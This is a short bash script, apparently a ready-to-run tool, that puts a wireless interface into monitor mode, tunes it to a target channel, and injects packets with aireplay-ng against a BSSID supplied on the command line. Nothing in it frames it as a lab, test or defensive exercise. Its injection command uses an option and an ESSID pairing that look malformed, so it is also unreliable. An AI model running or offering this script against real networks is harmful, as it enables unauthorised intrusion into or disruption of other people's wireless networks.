#!/bin/bash

# Packet Injection Script

# Check if the necessary tools are installed
if ! command -v aireplay-ng &> /dev/null; then
    echo "aireplay-ng could not be found. Please install aireplay-ng and try again."
    exit 1
fi

# Function to inject packets
inject_packets() {
    local target_bssid=$1
    local target_channel=$2

    # Put the wireless interface in monitor mode
    echo "Putting wireless interface in monitor mode..."
    sudo airmon-ng start wlan0

    # Change to the target channel
    echo "Changing channel to $target_channel..."
    sudo iwconfig wlan0mon channel $target_channel

    # Inject packets
    echo "Injecting packets into the network..."
    sudo aireplay-ng --inject -e "Injection" -a $target_bssid wlan0mon
}

# Main script
if [ $# -lt 2 ]; then
    echo "Usage: $0 <target_bssid> <target_channel>"
    exit 1
fi

inject_packets $1 $2